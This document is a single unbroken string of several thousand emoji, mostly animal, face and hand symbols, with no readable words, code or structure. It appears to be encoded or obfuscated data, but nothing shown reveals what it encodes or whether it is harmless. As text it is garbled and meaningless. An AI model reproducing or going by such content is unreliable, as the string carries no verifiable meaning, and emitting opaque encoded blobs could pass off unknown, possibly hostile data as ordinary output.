🐽👢👰👄👌🐰👊👍👢👑🐧👌👤👯👆👍🐧🐨👍👎👏👧👎👙👏👟👋👌👱🐽👂👛🐽👑👬👋👣👅👠👉🐪👟👦👍👎🐧👯👙🐩👅🐾👍👥👉👣👊🐾👉👧👋👍👛👊👎🐽👑👏👛🐻🐹👍👄🐻🐽👏👐👢👉👊👍🐨👁🐭👍👣👟👎👙🐾👉👃👍🐧👛🐾👉👢🐰👎👍👣👛👣👘🐨👦👰👍👤👧🐾👐👎🐼👯👎👏👟👎👙👢👧👟👌👡👅👊👋🐨👣👌👉👥👛👋👍👣👧👯👌🐩👧👊👍🐧🐨👎👍👡👍👍👄👥👉👩👐👎👯👆👉👢🐬👎👑🐽👧👠👉👢👧👀👍👤👫👘👌🐨👐👯👑🐿👅👏👙👏👟👏👋👌👉👉👜👍👑👏👄👋👉👠👄👍👍🐬👌👣👟👮👌👤👁👍👎👣👟👎👙👋🐽👊👋👌👑👪👅👣👁👫👛🐽👅👅👍🐨👀👯👍👣👛🐫👐👍👐👯👊👣👑👡👉👱👣👏👍👡👅👊👎🐽👛👎👎👥👅👎👄👢🐬🐿👍🐩👯👦👘👍👛🐾👊👥👣👎👙👋🐼👮👑🐻👁👎👚🐨👛👬👌👢🐬👏👉👋👍👐👍🐽👑👎👚🐧🐬👪👙🐽👑👍👙👌👑👏👋👌👉🐾👎👍👑👎👘🐾👫👏👉👣👧🐧👍👎👯👆👐👍👑👪👚🐾👟👑👄👥👟🐪👌👡🐽👮👉🐩🐽🐾👋👢🐬👅👙👎👚👯👍👤🐨🐫👘🐩👈👯👌👏👟👎👎🐾👯👌👍🐧👛👦👚🐽👌👮👍👋🐽👏👉👤👯🐧👋👍👑👆👎🐽👁👪👊👣👟👎👄👡👍👩👍🐾👯👂👛🐾👉🐼👋👣👟👟👄👍👧👰👍👡🐹👘👊👤👈👰👋👢👑👟👉👥🐹👆👌👤🐬🐺👄👣👑👨👊👥👧👣👉👢🐬👀👌👤👫👘👙🐽👁👫👌👤🐰👑👍🐼👑🐪👐👡🐽👘👎🐼🐨👌👌👤👟👅👘👱👌👮👍👤🐨🐧👘🐨👣👎👊👏👣👟👉👱👣👍👍👢👍👂👋🐽👑👏👜🐾🐽👡👄👍👑👰👎👢👛👦👋👣👑👌👉👋🐹👎👍🐼👑👭👐👡👁🐾👚🐨👅👪👘🐽👑👠👍🐩👟👏👎👎👯👦👋👤👍🐾👎👏👛👏👙🐿🐹👩👋👍👑👮👜👍👧🐽👍👋🐽👟👍👢👧🐨👌👍👟👢👍🐨👁👪👚🐽👉👍👍🐼👑👟👐🐩👪👯👍🐨👛👩👅👍👛👊👘🐪🐹👑👍👤🐧👮👜🐾👀👰👍👥👅👏👙👣👁👆👍👣👑👮👚🐨👑👫👜🐾🐽👣👙🐽👧🐧👑👌👟👢👘🐽👑👫👌👢👟👍👄👎👟🐪👍🐧👑👑👜👣🐽👩👘🐽👛👟👘🐪🐹👈👍👤👧🐾👌🐩👉👎👍👥👅👉👙🐾👉👧👍👤👫👮👍👣👐👯👑🐻👉👠👄👢👣🐫👐👢👑👢👐👍👁👪👎👣👅👑👙🐽👑👟👐👡🐽👊👎🐾👉👀👑🐽👉👎👙🐽👐🐨👎👢👍👡👅👍👐👰👊👣👑👡👉👎👯👟👍👣👛👊👛👣👑👨👊👢👫👋👉👣👑👰👋🐨👑👎👍🐩👁👀👈👡👑👎👙👏🐹🐿👎👍👑👢👎🐽👁👩👑🐾👟👊👘👱👍👮👍👎🐧🐨👈👢🐨👎👎👏👟👏👙🐾👉👘👍👡🐹👎👅🐽👑👏👅👍👅👍👄👢👧👰👋👣👑👪👎👤🐼👯👚🐾👟👎👄🐽👧👱👍👣👑👆👚🐨👅👩👅👍👅👠👉👤👫🐬👍👣👚👯👄🐼🐨🐿👉👥👁👅👍👤👯👊👐👋👅🐺👎🐽👣👪👘🐾🐰👎👉👤👯👏👍🐩👫🐧👘👢🐨👩👅👌👟👑👘🐨👧👭👍👡🐸👮👜🐽👅👫👆👍👟👟👄👌👧🐻👍🐽👑👢👋👤👍🐾👚🐼👣👋👙👎👟👋👋👋👁👦👍👍👑🐾👍👤🐽👢👄👢👑🐿👍🐩🐬👊👋👣👅🐿👘🐽👛👌👍👣👑👱👋👢👑👘👎🐼🐬👍👆👍👟👊👄🐿🐹👏👍👡👁🐫👘🐨👑👫👊👣👣👟👉🐼🐬👍👍👣👑👮👘🐽👐👮👍👋🐽👎👙🐽👁👱👎👢👌🐨👘🐼🐧👮👊👢👫👎👄👍👧👏👍👡🐽👍👜🐽👛👪👘🐽👉👠👉🐪👟👭👍👎👧👂👙🐨👛🐾👙🐿👁👏👙👤👉👎👌👤👯👮👜👣👐👰👛🐻🐹👟👘👱🐽👏👐🐧👟👪👍👎👁🐾👚🐿👁👑👍👤👉🐾👑🐻🐽👢👎👎👅🐾👑🐾👣👏👉🐩👟🐫👍🐩👫👊👈👤👍🐾👎👏👟👍👙🐾👯👦👌👤👯👮👎👍👍👨👊👤🐰👏👙🐾👉👐👋👍👟👮👋👣👑👪👚🐽👟👑👘🐩👟👃👎👍👑👂👅👤👁🐾👘🐽👧👟👄👏🐸👱👎👣👛🐫👎👤👍👍👅👍👟👢👉👣👑👦👑👎👫👘👎👍👛👌👈👤🐰👡👄👍👣🐪👋👍👟🐾👌🐩🐼👰👘🐾🐽👎👘👢🐬👭👐👌👑👩👜👌🐨👍👆👍👅👎👘🐪🐹🐭👎👍👍👢👙🐨👉👪👑🐼👑👋👙🐼👧👏👐👣👟👊👚👣👉👩👎👥👅👏👉👣👁🐨👍👎👯👎👘🐼🐨👎👚🐽👣👏👍🐪👉👩👍👋🐽👘👉🐨👍👪👍👣👉👠👍🐾👯👮👍🐽👑👘👛🐩👍👎👎👣👟👢👉🐼👁👎👋👌👉🐾👎🐽👣👩👌👣👅👎👄👌👦🐩👍👤👯👦👍🐩👁👌👉👢👯👍👙👏👟👇👐👱👁🐾👉🐨👛👫👙🐽👅👟👄🐧👁👘👍👤🐨👮👉🐨👣👎👙🐽👛👋👎🐾👟👧👌👢👑👮👍🐽👣👪👑🐻👉👌👄👍👧👯👌👤👫🐧👍🐽👑👫👌👣👣👘👉👎👄🐨👍👋🐸👯👍🐩👅🐽👙🐽👑👠👉🐩👟🐩👎👍👛🐫👋🐨👁👩👅👍👛👘👉👥🐹👧👌👤👫👮👊👍👑👫👛🐾🐽👏👙👍👑👐👍👤👫👦👘🐨👀👱👈👥🐹👍👙👋👍🐻👍👡🐽👘👎🐼🐨👌👌👤👣👅👍👣👐🐨👍👎👯👦👛🐨👍👫👊👣👑👏👙🐾👟👏👐👣👉🐾👌🐨👉👍👎👥👛👊👍👢👧👱👐🐧👛🐫👍🐩🐽🐭👍👡👑👏👍🐪👉👟👎👍👛🐾👍🐨👅👐👙🐾👟👊👜👤👯👐👍👤👧👆👌🐨👛🐾👑🐽👛👘👉👋👣👨👋👍👑👮👄👍👍👫👜🐽👅👟👉👋🐹🐫👌🐩👯👘👍🐩👁👌👉👋🐹👍👜👢🐽🐫👌👡👁👂👉🐨👛👪👘🐾👟👣👙👏👟🐩👍👣👛👮👉🐨👣👏👍👥👅👏👎🐾👯👨👌👡🐹👘👎🐽👉👍👌👢👛👏👍👣👧👏👐👌👛🐧👎🐽👁👪👚🐻🐹👎👍🐪👟👇👎👍👑👘👚🐩👅🐿👘🐽👧👅👙👤👞👱👍👎👧🐾👛🐨👀👰👉👢👛👌👘👱👍👆👐👣👛👡👜🐽👑👫👄👋👉👟👄🐻🐽🐿👍🐨👟👦👍👍👛🐿👘🐾👟👍👙🐾👉👋👍👡🐽👪👚👣👧🐾👋👣👟👎👙👏👞👮👍🐽👑👘👋🐩🐽👩👄👍👛👡👉🐼👁👟👍👣👛👦👌🐽👑🐼👉👤🐽👢👍👢👑👱👎👢👑👮👍🐨👐👯👉👡👅👎👘👢👁👟👌🐩🐨👉👜👍👉👩👎👤👟👊👙👢👁👇👍👎🐧🐨👈🐧🐨👪👎👥🐽👋👙👥🐹👪👌👤👪🐨👊🐽👑👫👅👍👛👏👉🐧👧👀👍👎👪🐬👎👤👁👌👉👥👑👑👘👢👑👟👐🐨👑🐾👛🐽👁👪👑🐼🐬👟👜👣👐🐩👍🐨👉🐺👍🐩👀👯👍👏👣👋👘🐩👟👎👐👢👛👦👍👣👑👫👜🐾🐽👅👄👍👧👐👑👌👛🐾👘👢🐨👐👈👢👧👏👘🐨👧👋👍🐾👯👘👎🐾👉🐭👈👣👛👎👉👍👧🐩👎👏👧🐾👍👤👍👎👊👣👣👠👉🐩👟👌👌👣👍👮👎🐽👛👏👜🐾🐰👌👙👍👑🐿👐👋👅👢👎🐾👁👩👅👍👟👎👙👏👉👟👋👍👑👢👚👣👑👌👉👤👟👎👘🐪🐸👯👍👍👑👦👘🐨👐👯👊👥👅👡👉👣👁👎👍👢👍👘👘🐽👢👰👚🐪👟👎👄👎👉👰👋👣👑👢👌🐩🐼👱👈👣👧👎👙👋🐹🐪👑👌👛👁👜👍👑👬👋👣👟👠👙🐼👧👇👍👤👯👘👛🐩👄👯👎👥👉👣👉🐧👑👪👐👢👑👪👅👍👧👍👘🐾👫👟👉👣👧🐧👍👎👫👦👍👢🐨👏👘🐻👅👎👄🐽👧👟👐👱🐽👢👛🐾🐽🐾👑🐾👟👟👄🐧👁👍👍👣👉🐺👐👍👣👏👋👥👅👘👊🐽👁👩👌👤👪🐨👋🐨👉👍👍👥👛👎👙🐽👣🐫👎👢👉🐺👘👌🐨👍👍👡👅👌👙🐽👑👩👍🐧👛👂👉🐨👛👪👍👣👛👅👉🐨👁👌👍👣👍👘👐👎👅👎👉👥👍👘👉👣👁👏👐👢👑👑👄👍👛👩👍👤👧👆👍👣👣🐬👌🐩👯👘👘👣👁👏👜🐾👟👎👙🐾👉👋👑🐾👯👘👚👍👅👩👛🐽👉👊👙🐽👧🐬👍🐻🐽👘👍🐨👐👰👊👢👣👉👘👣👧👏👐👣👟🐺👊🐽👛👎👎👤👫👏👉👢👧👰👐👌👛👮👌🐧🐨👬👘🐽👣👎👘👢👁👏👌👱🐽👆👉🐨👛👬👌👤👯👊👄🐨👁👈👍👎👧🐺👍🐧🐬🐾👎👣👟👆👍👋👣👐👌👤🐨👊👊👍👧👍👐👱👍👎👙👌👍🐫👍🐩👧👆👍🐧🐨🐾👚🐽👉👎👘👢👑👩👑🐽👑👮👊🐾🐽🐾👋👤👣👊👙👏👈🐨👍👤👯👡👜🐼🐨🐿👌👏👣👋👘🐩👉👌👐👤👪🐨👍👍👣👏👛🐾🐽👏👉👤👯👱👐👌👚🐬👍👍👁👫👜🐽👟👎👄👥👈👮👐👎👪👯👚👢🐬👍👘🐽👧👟👄👏🐹🐩👍👤👧🐹👛🐩👍🐾👋👥🐽👋👙🐾👉👏👐👢👍👮👊👍👛👎👌👢👛👏👙👍👑🐿👐🐧👍👪👍🐾👁👏👘🐽👉👌👍🐼👑👃👍👣👑👘👉🐨👑👫👉👤👫👅👘🐨👧👀👍👡👀🐨👌🐨👉👪👋👢👟👟👉👤👉👍👍👤👯👍👜🐽👐👮👎👣👧👣👍🐨👑👀👋🐨👛👦👋👣👑👏👆🐿👣👏👍🐪👉👨👋👣👑👘👍🐨👛👬👋👣👟👟👘👱👍👎👍👤👯👘👛🐩👍👪👎👥👉👣👉🐪👉👨👋👍👑👂👜👣👛👩👎👤👫👟👍👢🐬🐾👌🐩🐨🐾👍🐧🐨👎👚🐽👟👎👘👢👑👎👑👌👑👢👛👍👅👩👅👍👛👠👍👢👧🐫👍👣👉🐺👍🐩👈👯👑🐼👛👠👊🐼👧👐👐👤🐨👊👍👍👍👫👅👌👅👊👄👍👣🐬👑🐼👉🐺👘🐼🐨👍👙🐻👅👌👙🐽👑👩👍👣👛👂👉🐩👅👀👊👣👛👊👄🐩👟👦👍👡🐹👢👌👤👍👫👋👢👛👘👉🐩👯👐👌👡👁👦👍👣👑👪👘🐿👛👉👙👍👑🐿👍🐾👫👢👍🐾👁🐿👜🐾🐰👍👘👢👁👟👍👢👑👘👚👍👅👫👆👍👛👠👉🐨👁👑👎👢👍👢👄🐾🐽👍👄👏👁👠👉🐽👁👏👐👣👉👎👍🐽👑🐿👜🐾🐽👆👙👌👧👀👌👤👯👢👘👍👛🐿👑🐪👧👏👙🐽👧👟👎👍👛👊👉👢🐨👎👎👤🐽👊👙🐽👧👭👎👣👛🐧👐👍👛👎👑🐽👍👉👙👋👣👨👋👍👑👪👄🐨👉👎👘🐼👛👍👄👢👍🐬👐👌👛🐾👍🐩🐽👩👅👏👑👑👍👍👧👰👑👍👌👯👍👢🐰👎👋👣👛👟👄👎🐰🐪👍👣👚👯👅🐽👈👯👎👏👛👅👍👣👧👐👍🐧👟🐺👎🐽👣👪👘🐾🐰👎👉👣👐🐩👌👤👫🐧👘🐨👁👪👚🐻🐽👎👉🐪👟👇👐👍👑👁👜👤🐽🐿👆👍👛👎👜👢👀🐧👎👎👧👂👋🐨👀👯👎👥👍👍👙👏👟👌👌👡🐽👂👛🐨👑🐾👎👤👫👍👄👎👉🐿👍🐩👯👦👘🐨👁🐽👊👣👛👌👍👍👁🐿👍🐨👑👘👎🐾👉🐿👆👍👛👟👜👢👐👯👎👍👍👦👛🐨👛🐾👎👥👅👡👉👏👉👟👍👡👅👦👊🐽👣🐭👉👣👛👡👄👏🐹👀👐👌👛👦👙🐾👁🐾👙🐻👍👎👙👋🐽🐪👌👡🐽👪👎🐽👁👐👘🐾🐽👊👍🐩👟👐👎👍👉👂👙🐨👍👎👎👥👉👢👊🐾👉👍👋👍👑👮👄🐽👧🐽👘🐾👫👎👉👣👧👱👐🐧👟👮👎🐽👛👀👈👢👟👎👘🐨👍🐫👍🐧👑👎👚👤👁🐾👎👢🐬👠👙🐼👧👭👍🐨👑👢👅🐽👈👯👊👥👁👆👍👤👉👟👌👤🐬🐺👚🐽👍👫👛🐿👛👋👍👣👧🐧👑🐼👛🐾👘🐧🐨👏👌👢👣👎👙👏👉👱👍👣👛👂👊🐽👍👬👈👣👑👟👘🐨👧👄👍🐾🐨🐫👐👎👅👪👘🐪👧👟👉🐩👯👆👍👤👯👑👄🐽👑👨👊👡🐹👑👍👤👉👀👌👤🐬👆👘👣👁👫👘🐽👟👑👍🐼👑👟👑👍👑👮👍👣👛👬👋👣👛👎👘🐪🐹🐭👎👋🐹👢👅🐽👌👰👊👣👛👋👙👌👑👐👍👢👍👂👘🐽👛👎👑🐼👛👎👄👎👉👑👐👢👛👦👌🐩👁👏👘🐽👧👏👍🐪👉👩👍👎🐨👉👜🐽👧🐾👑🐽👟👠👘👱👍👐👍🐽👛👱👄👍👅🐾👎👏👣👣👉👱👣👦👍👤👫👪👅🐽👌👰👅👎🐰👎👄👌👧🐧👍👍👟👢👎🐽👑👪👚🐼👫👘👍👍👧👏👍🐨👛🐾👉🐩🐽🐿👙🐽👟👊👘🐪🐸👱👍👤👯👢👛🐨🐼👰👌👏👟👘👊🐼🐬👧👌👤👯👮👍🐨👣👪👍👤🐽👏👉👣👁👎👍👎👫👢👎🐽👑👪👚🐽👟👑👍👎👈👮👍🐧👑👂👚🐩👅🐼👈👣👛👎👄🐩👟👈👍🐨👑👘👐👎👄👰👋👢👟👟👉👥🐹👆👐👤🐨👥👜👣👑👏👚🐼👛👢👄👌🐬👀👌🐩👫👦👘👍👁👩👅👍👣👍👙🐽👑🐪👍👋🐽👘👛🐼🐨👀👑🐾👯👊👍🐽👑👁👍👎👯👦👙🐨👐👯👑🐼👟👟👉👤👯👘👐👣👟👅👜🐽👑👨👉👥👅👡👙🐿🐹👀👋🐨👛👮👘👍👁👪👎👏👧👎👄👥👉👟👍🐻🐽👑👜🐽👅👬👋👣👉👠👉🐩👟👐👍🐽👛👮👍🐨👍🐾👎👢👍👊👙👌👑👩👍👤👫👘👜👣👛👩👎👥👛👎👄👍👣🐫👌👤👧👆👍🐩🐽👩👊👤👟👍👄👡🐽👊👑👍👑👊👚👣👛👫👘🐽👅👠👘🐧👧👈👍👣👚👮👄👍🐼👮👄👏👅👏👙👢👑👌👐👤🐬🐺👚🐨👍👫👚👱🐽👋👍👣👑🐧👑🐼👛🐾👘👍👁👩👚🐻🐹👎👍🐪👄🐨👍🐩🐨👂👍👍👁👬👎👣👧👟👘🐨👧👦👎👋🐽👘👉🐩👉🐾👊👥👅👘👉👋👍👦👑👎👯👑👄👣👐👯👌👢👅👎👄👢👣🐫👍👣👟👪👍🐾🐼👰👘🐽👛👑👘🐩👉👭👍👤👯👘👛🐾👍🐿👉👢🐬👅👍👥🐹👑👎👣👍👢👉🐩🐽👩👄👍👛👏👙👤👯👐👐👋👁👊👛👣👑🐿👜🐾🐽👎👍👢👧👍👌👎👯👢👍🐨👁👎👚🐻👁👏👍🐪🐹👃👌👡👁👅👜🐽👉👬👋👤👟👊👙🐿🐹👮👍👤👧👂👙🐨👛🐾👑🐽👟👣👉👱👣👍👐👣👑👘👊🐽👐👯👘🐾👫👏👉🐧👧👁👌👎🐬👂👍👍👑👪👚🐻👅👘👍👣👧🐪👌👤👯👘👍👍👁👫👘🐽👛👟👄🐧🐽🐫👍👣👑👘👙🐩🐼👯👑🐼👟👋👘🐩👉👐👐👤👫👘👍👣👣👩👑🐽👅👊👄👏🐹🐽👌👍👟👦👍🐧🐨👏👌👥👣👌👙🐽👧👩👍👋👁🐽👜👣🐽👪👚🐽👛👠👍🐼👀👱👎👣👍👢👊👤👍👎👍👥👍👌👙🐾👟👐👌👡🐽👂👎👣👛👏👜🐾🐰👍👄👍👧👏👍👤🐬🐾👌👤👁👍👎👣👍👑👘🐨👧👟👋👌👑👮👍👣👧🐽👑🐾👟👊👙🐿🐹🐬👎👎👫👊👌🐨👑👫👊👢👟👟👊🐼👧👏👐👎👫👮👋🐽👑👪👎👢👫👎👍👢👑👱👐🐧👛🐫👘🐼🐧👮👊👣🐽👎👄👥👟👏👎👍👛🐽👜👍👍👪👑🐽👛👠👘👱👍👎👎👎👯👢👅🐽👑🐾👌👣👛👎👙👤👉👏👐👢👑👪👅🐽👛👩👌👢👅👎👄🐻🐽👱👌👤👧👊👎🐾🐼👰👘🐽🐹👎👄🐾👉🐾👑👍👛🐾👊👍👉👪👎👤👟👟👜👣👑🐽👍👤👯👎👐👍👣👏👌👢👟👎👘🐩👯👍👐👏👧👪👍🐽👣👩👑🐻👅👅👍👣👧👀👑👌👑👘👋🐨👐👮👎👢👣👍👄👥👉👟👐👎👯👂👛🐾👍🐿👉👣👛👠👉👥🐸👱👎👢👛🐫👐👎👅👎👋👥👁👘👉🐪🐹👦👑👎👯👘👎👍👑👩👐🐪👟👊👄👍👍🐫👌🐩👯👢👘👣👁🐾👚🐽👟👑👙🐾👟🐻👌🐧👑👢👍🐨👛👫👛🐽👟👊👘🐪🐹🐬👍🐩👫👢👙🐨👌👰👉👡👑👎👙👤👉👏👍👥👧🐹👜🐽👍👏👚🐪👟👡👄👎👉👑👐👌👑👦👘👍👀👯👊👤👟👎👙👏🐹🐻👍👡🐸🐨👉🐨👛👪👘🐼🐰👎👍🐾👯👑👍👎🐧👯👌🐨👅👎👚🐽👑👑👜👣👑👏👐👣👍👎👅🐽👐👰👚🐼🐰👎👄🐻🐽🐿👐🐧👑👊👍🐩🐽👩👎👥👁👘👉👣👧🐪👌🐧👛🐾👉🐨👉👫👙🐽👅👠👎🐽🐼👯👍👤🐨🐫👘👤👍🐽👄👌👑👅👍👎👟👋👐👤👫👮👋🐨👑👫👄👍👅👎👍👤👯👐👑🐼👛🐾👎🐽👁👪👚🐿👟👎👉👱🐸🐨👍👤👯👂👛🐾👍🐾👘🐽👛👅👙👣👀👱👎👎👫👘👊🐩👅👩👅👍👍👊👙🐾👟👦👋👍👟🐺👜👍👛👎👎👤🐽👟👄👌👣🐫👍🐾🐬👆👘👍👁👫👌👥🐹👎👘🐨👑👂👋👌👑👘👚🐨👢👱👘🐽👛👅👍👎👮🐧👎👋🐹👎👚🐨👐👰👊👢👑👆👎🐼👁👎👐👢👛👦👉🐽👧🐼👉👤🐽👢👉🐨👑👀👌👤🐨🐧👋👤👁🐽👚🐻👑👎👘👢👦👮👐👋🐽👪👍🐨👉👩👙🐽👁👟👜👤👯👐👎👍👛🐧👐👎🐽🐾👚🐽👟👣👉👥🐹👪👌👡🐹👘👊👣👑🐿👜🐽👛👌👙🐽👧🐨👌👎👧👎👍🐨👀👱👘🐿🐽👌👙🐽👧👟👍👡🐽👢👛👍👉👪👘🐾👟👟👜👣👑👏👍👤🐨🐫👐👎👈👰👉👢👛👏👎🐾👉👏👍👢👍👘👎🐽👣👩👎👢👫👣👙🐾👉👰👍👣👉🐾👘🐽👁👌👈👡👅👍👄👥👈👮👍👡🐸👯👍🐩👅🐾👘🐽👛👟👘🐨👧👏👎👣👍👘👘🐩👄👰👉👢👛👍👙👎👟👆👐👢👍👮👅🐽👑👪👑🐿👛👋👄👢👣🐫👍🐨👟👦👍👤👁🐾👚🐾👟👍👙👏👄👯👍🐨👑👎👛🐾👍🐾👑🐼🐬👅👍👤👮🐨👎👢👍👊👈🐩🐽🐽👄👍👑👠👉🐼🐬👍👐👢👑👘👚👣👑👪👑🐼👫👊👄👢🐬👁👌🐩👯👢👌🐧🐧👰👘🐾🐰👎👘👢👁👩👍👎🐨👎👛🐽👉👩👑🐾🐽👊👄👥👟👑👍👎👧👂👙🐨👑👪👎👥👅👟👊🐾👉👊👐👣👑👘👊🐽👑🐿👛🐾👫👎👉🐧👧👀👑👌👚🐬👍👤🐽👩👊👤👟👎👘🐨👧👟👐🐨👑👆👛🐼🐰👎👑🐾👣👊👄👌👧👘👍🐩👫👎👘🐧🐨🐿👉👣👑👅👎🐼👧👧👌👢👑👂👎🐽👣👪👌👣👛👎👉👣👧👀👑👌👛🐾👋🐩👁👍👚🐼👣👍👙👏👟👩👐👍👑👘👉👣👑👐👑🐽👛👠👍🐼👌👮👍👤👧👂👌🐨👁👩👅👍👛👟👉🐪👉👋👐👢👑👮👛👣👛👪👑🐻🐹👑👍👤👉👏👎👢👑👦👘🐨👁👩👅👍👑👌👍👣👧👱👋👋🐽👊👍🐩🐽🐽👑🐽👛👅👘🐨👐🐩👎👍👍👢👉🐨👛👪👎👢👑👏👘👢🐬👏👌👣👑👮👄🐨👍👫👜🐾👫👡👄👏🐹👀👑🐼👑👢👋👣👅🐽👊👢👫👎👙🐾👅🐫👋👢👑👉👜🐽👛👐👑🐼🐬👎👙🐿🐹👑👍👡🐹👦👈🐨👛🐾👙🐿👅👟👉👱👣👏👌👤👯👑👄👣👍👫👛🐻🐹👟👄👌👧👱👐🐧👉🐾👍🐨👀👱👘🐽🐹👑👍👤👉🐾👑👌👛👆👉🐩👅🐾👘🐽👛👅👄👌👧🐬👍👤👯👊👊🐨👈👯👊👏👟👏👙👣👑👋👐👢👌🐨👙🐨👉👎👘🐼👅👣👍👣👧🐿👍🐩🐨🐧👍👢🐨👏👌👢👟👎👄👥👟👭👐👋🐽👂👉👣👅👪👑🐽👍👎👍👢👧👀👍👡🐹👘👚🐩👅👪👍👥👅👌👙🐾👉👆👍👣👚🐫👜👍👑👫👄👋👉👉👄👎👉🐿👍🐩🐬👆👘👣👁👐👌👤👟👎👙👋🐽👋👌🐧👑👎👛🐾👅🐭👍👣👛👅👍👥🐹🐭👍🐩👫👍👄👍👉👫👊👣👟👟👉👋👣👏👐👣👉🐾👄🐨👍👨👉👥👅👏👉👢👧👑👐👌👛🐾👌🐨👐👰👘🐽👣👏👍👣👁👃👐👡🐽👎👍🐨👛👬👌👤👫👋👉🐨👁👎👍🐽👑👘👛🐧🐨🐾👚🐼👑👟👉🐪👉👏👌👤👯👮👜👣👢👮👘🐿👛👏👉👤👉👁👌👎👫👦👍🐩🐼👯👍👡👉👎👄🐽👧👏👐🐩🐨👂👉🐨👛👩👅👎👣👠👉👏🐹🐩👍👡🐽👘👘🐧🐬🐾👌👏👟👋👙👢👧👇👍👤🐨👊👙🐨👍👫👅👌👅👡👉👣👑👯👌🐩🐧🐬👍🐨👑👪👚🐼👟👎👍🐪👉👩👐👋🐸👯👍🐩👁🐼👌👣👟👟👄👤👟👌👎👍👉🐾👊👤👍👪👉👥👍👉👙🐽👧👦👐👋🐽👮👋👍👑🐿👄👋👉👑👍🐧🐬👱👐🐧👍👎👍👤👁👏👜🐼🐰👎👙👏👟👘👋👍👑👘👎🐾👍🐿👆👎👧👅👘🐨👐🐨👍👤🐧🐨👊🐨👛🐿👊👢👟👣👉👤👟👘👐👢👛👦👛👣👣👍👎👥👅👎👙🐾👉🐨👎👢👑👆👍🐩🐼👱👈👏👛👏👘🐨👑👟👍🐻🐽👊👚🐨👛👐👘🐽👉👟👙🐼👧👐👎👍👛🐧👛👢🐨🐾👍👡👑👊👙👏👉👋👋👍👌🐨👎👣👣👩👑🐾🐰👍👄👢👧👐👐👌👑👪👎🐽👐👱👘🐿👑👎👍🐼👑👩👌👡🐽👮👉🐨👧🐿👉👣👅👎👉🐪👟🐫👍👢👑👘👐👎👈👮👄👍👛👎👙👣👁👪👌👣👉👪👙🐨👑👫👛🐿👅👆👉👣👍🐬👋👣👚🐬👍🐧🐨👍👚🐻🐹👎👍👤👟👩👍🐧👑👘👚🐩👅🐽👛🐾🐽👎👍👥🐹👐👍👡🐽👢👉🐨👀👰👉👢👟👠👉👤👟👋👐👋👅🐹👜👍👑👫👜🐾👫👢👄👌👣🐫👐👢👑👦👍🐩👁👩👅👍👣👎👄🐾👈🐧👐👱🐽👎👚🐨👧🐾👋👣👟👊👙🐼👧👑👎👢👍👘👘🐨👈👯👊👥👉👢👉🐼🐬👐👐👋👁👅👄👍👐👮👎👢👫👡👄👢🐬🐽👌👎👯👢👍🐧🐧👰👘🐽🐽👎👄👍👧👟👎👍👛👅👜👍👉👩👘🐾👟👊👙👢👁👇👎👎🐧👯👙👤👍👪👎👣👟👡👉👎👉👩👋👍👍👪👅👍👍👫👛🐾👫👎👍🐧👐🐩👍👤👪🐬👎👤👁🐿👌👥🐽👘👍👍👧👟👑🐼👌👯👍👍👍👫👘🐼🐬👠👉👍👢👮👍👣👛🐫👙🐩👀👰👉👣👛👋👙👣👁👦👌👤👯👮👐👍👑👩👍👥👛👎👉👣👣🐪👍🐩🐬👆👘🐨👀👯👎👢👛👘👉👎👉🐪👍🐾👯👘👚🐨👛👐👚🐽👛👅👙👣👁👦👍👢👉👂👉🐩👅👩👄👍👛👟👉🐪👟👌👌👡👅👦👎👍👑🐾👐👱🐽👠👄👢🐬👱👍🐩👫👎👌🐩👁👍👎👥👁👎👙👏👉👟👑👎👯👢👚👣👛👬👑🐽👛👅👍👤👮🐧👍👎🐨👮👋🐨👐👰👉👥👁👋👙👎👟👎👋👎👧🐾👌🐨👧👎👎👣👅👡👙🐾👉🐧👐👌👑👆👘👎🐼👮👚🐽🐽👎👙🐾👅🐪👋👍👑🐽👛🐧🐨👐👋👣👟👠👘🐨👧👍👎👎🐧🐨👈🐩👄👯👍👥👉👡👜👢👑👌👍👤👯👘👄🐽👧🐽👑🐼👛👟👍👢👧👰👐🐧👉🐺👍🐨👑🐭👈👋🐽👎👄👥👟👟👌👤👪🐨👍👣👍👪👎👢🐬👎👙👢👁🐬👍👤🐨🐫👐👍👈👰👋👣👛👎👙👣👁👦👌👣👉👎👙🐨👧👏👜🐽👛👅👄👍👧🐧👋👌👟👦👋👣👀👮👍👡👉👑👘🐨👧👩👍👢👑👢👊🐾👍🐿👆👍👑👠👙👢👁🐭👍👤🐨🐫👐👎👅👪👎👥👁👢👉👣👑👋👐👢👟🐺👎👣👛👪👍👤👫👊👄👢👑👰👋👍👑👪👌👤🐼👱👈👣👣👑👍🐼👑🐪👍👌👑👘👊🐾👍🐿👉👤👫👊👄👌👢👰👍👎🐨🐫👘🐩🐽🐽👄👍👣👉👘👢👧👐👍🐧👟🐺👊🐽👑👫👄👍👛👎👄👌🐬👱👐👢👛👪👌🐧🐨👫👘🐽👑👎👍🐪👟👏👑🐻🐽👢👉🐨👧🐾👘🐾👯👊👜👤👯👎👎👎👯👘👐👍👅🐾👙🐽👍👌👙👏👉👐👌👡🐹👮👊🐽👢👮👘🐼👫👎👍👣👧👱👐🐧👉👆👐👍👑👪👚🐻👅👍👙👏👟👟👍👣👑👂👛🐾🐽🐾👑🐾👟👅👄🐼👐🐧👍👤👯👘👘🐩👈👯👍👏👟👏👎🐾👟👐👐👋🐽👮👚👍👍👩👍👋🐽👎👄👍👧👰👍👤🐨🐾👘🐽👁👫👛🐻👍👑👜👢🐬👭👍👡🐸👯👎🐽👍👨👈👣👧👟👄👏🐹👈👍👣👉👂👉👤👍👪👉👥👅👡👉👤👉👧👌👡🐸🐧👜👣👛👪👍👤👫👋👙👍👑👏👍🐩🐬👎👍👎👁🐿👘🐿🐹👑👎🐿🐹👏👍🐩👯👢👎🐾👍🐿👆👍👑👅👍👥🐹👐👍👤🐧🐨👉🐨👌👰👊👣👑👏👙🐽👑👎👐👣👟👦👜👣👉👪👎👥👛👎👙👌👑👀👑🐼👑👢👋👣👁🐽👎👣👟👏👍🐼👁👟👐👡🐽👢👛🐽👁👬👊👢🐰👎👉👋👍👐👍🐽👍👘👛🐨👣👎👚🐽👟👣👉👎👉👨👐👣👍👘👊🐽👛👩👑🐾🐰👟👉👋🐹🐪👌🐩👯👂👍🐩👁👌👉👡👅👍👘👢👑👘👑👍👑👎👚🐨👧🐾👍👤👣👟👜👣👑👑👍🐨👛🐫👘🐧🐬🐾👎👢👛👍👙🐾👉👏👐👤🐨👊👎🐽👣👩👎👥👅👆👉👤👉👰👍👎👯👆👘🐽👑👌👉👥👣👑👘🐨👁👇👍👣👛👂👉🐩👅👀👊👣👛👅👉🐨👁👄👎👏👧🐾👋🐩👅👩👆👍👛👏👙👎